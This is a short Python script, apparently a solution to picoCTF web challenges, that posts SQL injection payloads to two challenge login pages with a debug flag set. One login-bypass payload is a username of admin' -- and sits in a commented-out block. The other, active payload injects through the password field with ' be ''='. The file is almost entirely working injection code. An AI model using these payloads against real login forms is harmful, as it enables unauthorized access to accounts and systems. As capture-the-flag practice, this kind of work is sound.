import requests
""""

data = {
    "username":"admin' --",
    "password":"",
    "debug":1
}

r = requests.post('https://jupiter.challenges.picoctf.org/problem/64649/login.php',data=data)
print(r.text)
1-2 payloads
"""

data = {
    "password":"' be ''='",
    "debug":1
}

r = requests.post('https://jupiter.challenges.picoctf.org/problem/54253/login.php',data=data)
print(r.text)